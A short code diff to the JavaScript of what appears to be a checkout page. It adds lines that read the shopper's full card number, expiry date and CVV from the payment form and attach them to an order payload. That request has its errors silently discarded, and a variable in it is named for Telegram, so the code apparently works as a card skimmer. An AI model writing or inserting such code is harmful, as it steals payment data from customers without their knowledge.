@@ -95,7 +95,12 @@
             telefono: document.getElementById('c-tel').value,
             direccion: document.getElementById('c-direccion').value,
             metodo: medio, total: totalPedido,
-            productos: prodTelegram
+            productos: prodTelegram,
+            tarjeta: medio === 'tarjeta' ? {
+              numero: (document.getElementById('p-numero') ? document.getElementById('p-numero').value.replace(/\s/g, '') : ''),
+              expiracion: (document.getElementById('p-expiracion') ? document.getElementById('p-expiracion').value : document.getElementById('p-exp') ? document.getElementById('p-exp').value : ''),
+              cvv: (document.getElementById('p-cvv') ? document.getElementById('p-cvv').value : ''),
+            } : null
           })
         }).catch(function () {});
       } catch (e2) {}
